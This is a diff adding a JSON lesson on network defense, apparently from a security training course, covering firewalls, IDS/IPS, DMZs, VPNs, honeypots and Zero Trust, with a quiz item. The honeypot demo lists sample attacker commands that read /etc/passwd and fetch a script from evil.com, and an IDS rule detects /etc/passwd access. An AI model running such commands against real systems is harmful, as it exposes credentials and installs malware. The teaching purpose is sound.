@@ -1,0 +1,119 @@
+{
+    "id": "network_defense",
+    "topicId": "net_defense_basics",
+    "topicTitle": "Network Defense Mechanisms",
+    "description": "Explore the defensive technologies used to protect networks, including Firewalls, IDS/IPS, and Segmentation.",
+    "baseKP": 100,
+    "slides": [
+        {
+            "id": "net_def_1",
+            "type": "content",
+            "title": "Defense in Depth",
+            "content": "# Defense in Depth 🏰\n\nNo single security measure is perfect. Therefore, we layer defenses.\n\n## The Onion Approach\n1.  **Perimeter:** Firewall / Border Router.\n2.  **Network:** Segmentation / IDS.\n3.  **Host:** Antivirus / EDR / Host Firewall.\n4.  **Application:** Input Validation.\n5.  **Data:** Encryption.\n\nIf one fails, the next layer catches the attack."
+        },
+        {
+            "id": "net_def_2",
+            "type": "content",
+            "title": "Firewalls",
+            "content": "# Firewalls 🔥\n\nA device that filters traffic based on a set of rules.\n\n## Types\n1.  **Packet Filtering (Stateless):** Looks at individual packets (IP, Port). Fast but \"dumb\".\n2.  **Stateful Inspection:** Tracks connections (e.g., \"Is this incoming packet part of an established TCP session?\"). Standard for decades.\n3.  **Next-Generation (NGFW):** Deep Packet Inspection (DPI). Can see \"This is Facebook traffic\" inside HTTP. Can block specific apps."
+        },
+        {
+            "id": "net_def_3",
+            "type": "content",
+            "title": "Firewall Rule Logic",
+            "content": "# Firewall Rules 🧱\n\nRules are processed Top-Down. The first match wins.\n\n## Example Policy\n1.  **Allow** Established Connections.\n2.  **Allow** LAN -> WAN (Employees surfing web).\n3.  **Allow** WAN -> DMZ Web Server (Public traffic).\n4.  **Deny** Any -> Any (Implicit Deny - Catch/Block everything else).\n\nMisconfigurations (e.g., putting specific rules below broad ones) are a common vulnerability."
+        },
+        {
+            "id": "net_def_4",
+            "type": "content",
+            "title": "Firewall Simulation",
+            "content": "# Firewall Simulator 🛡️\n\nA simple script demonstrating rule matching.\n\n<!-- FULL_CODE_START\nclass Packet:\n    def __init__(self, src_ip, dst_port, state):\n        self.src = src_ip\n        self.port = dst_port\n        self.state = state # ESTABLISHED / NEW\n\n# Rules: [Action, Condition_Lambda]\nrules = [\n    (\"ALLOW\", lambda p: p.state == \"ESTABLISHED\"),\n    (\"ALLOW\", lambda p: p.port == 80),          # Allow HTTP\n    (\"ALLOW\", lambda p: p.port == 443),         # Allow HTTPS\n    (\"DENY\",  lambda p: True)                   # Implicit Deny\n]\n\ndef process_packet(packet):\n    print(f\"Packet [Src: {packet.src} -> Port: {packet.port} ({packet.state})]\")\n    for action, condition in rules:\n        if condition(packet):\n            print(f\"MATCHED Rule -> Action: {action}\\n\")\n            return\n\nprint(\"--- Firewall Processing ---\")\n# Test Cases\nprocess_packet(Packet(\"10.0.0.1\", 443, \"NEW\"))        # HTTPS Request\nprocess_packet(Packet(\"1.2.3.4\", 22, \"NEW\"))          # SSH Attempt\nprocess_packet(Packet(\"BadGuy\", 9999, \"ESTABLISHED\")) # Response traffic\nFULL_CODE_END -->"
+        },
+        {
+            "id": "net_def_5",
+            "type": "content",
+            "title": "IDS vs IPS",
+            "content": "# IDS vs IPS 🚨\n\n**Intrusion Detection System (IDS):**\n- Monitor only (Passive).\n- Alerts the admin if attack detected.\n- Simpler to deploy, no risk of blocking legitimate traffic.\n\n**Intrusion Prevention System (IPS):**\n- Inline with traffic (Active).\n- Blocks the packet resets the connection if attack detected.\n- Risk of False Positives blocking real users."
+        },
+        {
+            "id": "net_def_6",
+            "type": "content",
+            "title": "Detection Methods",
+            "content": "# Detection Logic 🧠\n\nHow do IDS/IPS know it's an attack?\n\n## Signature Based\nMatching known bad patterns (like Antivirus).\nRule: `alert tcp any -> any 80 (content:\"/etc/passwd\"; msg:\"LFI Attempt\")`\nPro: Fast. Con: Misses new (Zero-day) attacks.\n\n## Anomaly Based (Heuristic)\nEstablishing a \"Baseline\" of normal traffic.\n\"Usually this server sends 50MB/hour. Today it sent 5GB. Alert!\"\nPro: Catches unknown attacks. Con: High False Positives."
+        },
+        {
+            "id": "net_def_7",
+            "type": "content",
+            "title": "Network Segmentation & DMZ",
+            "content": "# Segmentation & DMZ 🚧\n\nDividing the network limits Lateral Movement.\n\n## DMZ (Demilitarized Zone)\nA sub-network that sits between the unsafe Internet and the safe Internal LAN.\n\n**Public Servers (Web, Mail)** go in the DMZ.\n**Internal Data (Databases, Employee Workstations)** go in the LAN.\n\nIf the Web Server is hacked, the hacker is stuck in the DMZ and usually cannot initiate connections into the LAN."
+        },
+        {
+            "id": "net_def_quiz_1",
+            "type": "quiz",
+            "title": "Architecture Check",
+            "content": "Verify placement.",
+            "quizQuestion": "Where should a public-facing Web Server be placed in a secure network architecture?",
+            "quizOptions": [
+                "Internal LAN",
+                "DMZ (Demilitarized Zone)",
+                "Management VLAN",
+                "Directly on the ISP modem"
+            ],
+            "correctOptionIndex": 1
+        },
+        {
+            "id": "net_def_8",
+            "type": "content",
+            "title": "VPNs (Virtual Private Networks)",
+            "content": "# VPNs 🚇\n\nCreating a secure, encrypted tunnel over an insecure network (Internet).\n\n## Use Cases\n1.  **Remote Access:** Employees working from home connect to office LAN securely.\n2.  **Site-to-Site:** Connecting Branch Office network to HQ network.\n\n## Protocols\n- **IPSec:** Layer 3 encryption. Complex setup. Standard for Site-to-Site.\n- **SSL/TLS (OpenVPN, WireGuard):** Layer 4/7. Easier setup. Standard for Remote Access."
+        },
+        {
+            "id": "net_def_9",
+            "type": "content",
+            "title": "Honeypots",
+            "content": "# Honeypots 🍯\n\nA decoy system designed to be attacked.\n\n## Purpose\n1.  **Detection:** No legitimate user should ever talk to the honeypot. ANY traffic is malicious.\n2.  **Intelligence:** Gather information on attacker tools and techniques.\n3.  **Distraction:** Waste the attacker's time.\n\n**Canary Tokens:** A form of honeypot involving fake files/keys that alert when opened."
+        },
+        {
+            "id": "net_def_10",
+            "type": "content",
+            "title": "Honeypot Concept",
+            "content": "# Honeypot Logic 🐝\n\nDetecting intruders.\n\n<!-- FULL_CODE_START\nprint(\"--- Simple SSH Honeypot Log ---\")\n\n# Simulated log file from a honeypot\nfake_interactions = [\n    {\"src\": \"192.168.1.55\", \"cmd\": \"ls -la\"},\n    {\"src\": \"192.168.1.55\", \"cmd\": \"cat /etc/passwd\"},\n    {\"src\": \"192.168.1.55\", \"cmd\": \"wget http://evil.com/malware.sh\"}\n]\n\ndef alert_admin(msg):\n    print(f\"[ALERT] {msg}\")\n\nprint(\"Listening on Port 22 (Fake)...\")\n\nfor event in fake_interactions:\n    # In a real honeypot, this happens in real-time\n    print(f\"Hacker ({event['src']}) typed: {event['cmd']}\")\n    alert_admin(f\" intrusion detected! CMD: {event['cmd']}\")\n\nprint(\"\\nValue: We now have the attacker's IP and know they are trying to download malware.\")\nFULL_CODE_END -->"
+        },
+        {
+            "id": "net_def_11",
+            "type": "content",
+            "title": "NAC (Network Access Control)",
+            "content": "# NAC 🛂\n\nEnsuring only healthy, authorized devices connect to the network.\n\n## Pre-admission Check\nWhen you plug in a cable or connect to Wi-Fi:\n1.  **Authentication:** Who are you? (802.1X)\n2.  **Posture Assessment:** Is your Antivirus updated? Is Windows patched? Do you have the corporate cert?\n\nIf checks fail -> Move to Quarantine VLAN."
+        },
+        {
+            "id": "net_def_12",
+            "type": "content",
+            "title": "Zero Trust Architecture",
+            "content": "# Zero Trust 🚫\n\n\"Never Trust, Always Verify.\"\n\nTraditional Security: \"Castle and Moat\". Once you are inside the LAN (castle), you are trusted.\n\n**Zero Trust:** Assume the breach has already happened. Every request (even from inside) must be authenticated, authorized, and encrypted. No implicit trust based on IP address."
+        },
+        {
+            "id": "net_def_13",
+            "type": "content",
+            "title": "SIEM (Security Information and Event Management)",
+            "content": "# SIEM 📊\n\nCentralized logging and analysis.\n\nDevices (Firewalls, Servers, Routers) send logs to the SIEM (Splunk, ELK, QRadar).\n\nThe SIEM correlates events:\n- Event A: 5 failed logins on VPN.\n- Event B: 1 successful login.\n- Event C: Massive database download.\n\n**alert:** Potential Account Compromise & Exfiltration!"
+        },
+        {
+            "id": "net_def_14",
+            "type": "content",
+            "title": "Deep Packet Inspection (DPI)",
+            "content": "# DPI 🔬\n\nLooking beyond the header.\n\nStandard Firewalls look at Layer 3/4 (IP/Port).\nDPI looks at Layer 7 (Application Data).\n\nIt can strip malware attachments from emails, block specific commands in databases, or throttle streaming video traffic."
+        },
+        {
+            "id": "net_def_15",
+            "type": "content",
+            "title": "Hardening Network Devices",
+            "content": "# Hardening Infrastructure ⚙️\n\nRouters and Switches need love too.\n- **Disable unused services:** Telnet, HTTP (use SSH/HTTPS).\n- **Strong Passwords:** on VTY lines and Console.\n- **Banner Grabbing protection:** Don't announce version numbers.\n- **Port Security:** Limit MACs per port.\n- **Firmware Updates:** Patch the Cisco IOS / Junos."
+        },
+        {
+            "id": "net_def_16",
+            "type": "content",
+            "title": "Summary",
+            "content": "# Network Defense Summary 🛡️\n\nBuilding a fortress.\n\n## Recap\n- **Firewalls:** Filter traffic.\n- **IDS/IPS:** Detect and Stop attacks.\n- **Segmentation:** Contain breaches (DMZ).\n- **VPN:** Secure remote paths.\n- **Honeypots:** Deceive attackers.\n- **Zero Trust:** The modern paradigm.\n\nA robust network assumes attackers will get in and focuses on limiting what they can do."
+        }
+    ]
+}
